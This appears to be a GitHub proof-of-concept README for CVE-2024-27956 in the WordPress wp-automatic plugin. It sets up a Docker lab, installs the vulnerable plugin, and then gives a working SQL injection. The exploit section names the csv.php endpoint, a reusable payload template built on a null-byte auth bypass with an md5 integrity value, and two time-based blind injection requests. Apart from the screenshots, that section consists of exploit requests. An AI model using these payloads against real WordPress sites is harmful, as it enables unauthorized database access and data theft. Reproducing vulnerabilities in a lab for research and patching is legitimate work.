# CVE-2024-27956
Note

Build wordpress: docker-compose -f stack.yml up

Install plugin:
1. WordPress dashboard, choose Plugins > Add New

2. Click Upload Plugin

![image](https://github.com/truonghuuphuc/CVE-2024-27956/assets/20487674/39c596dd-bb5c-457f-87e8-b811a1cd0f12)

3. Choose File -> wp-automatic.zip ->  Install Now

![image](https://github.com/truonghuuphuc/CVE-2024-27956/assets/20487674/13880686-b083-458b-975d-2cab35c11fc0)

4. After the installation is complete, click Activate Plugin

![image](https://github.com/truonghuuphuc/CVE-2024-27956/assets/20487674/ecfc78d1-7a43-4ca1-88a0-d6e9db875e60)

Exploit

```<HOST>/wp-content/plugins/wp-automatic/inc/csv.php```

```q={{query}}&auth=%00&integ={{md5query}}```
```
q=SELECT+IF(1=1,sleep(5),sleep(0))&auth=%00&integ=93cf9aa11e746596d6f31765a7222c9f
```
![image](https://github.com/truonghuuphuc/CVE-2024-27956/assets/20487674/f480537c-5961-4f15-9671-0cc4bf4afd8a)
```
q=SELECT+IF(1=2,sleep(5),sleep(0))&auth=%00&integ=4b1f4024af81df56c3b00679b9b52183
```
![image](https://github.com/truonghuuphuc/CVE-2024-27956/assets/20487674/7311aa48-9c2b-43a9-a858-6488badff071)
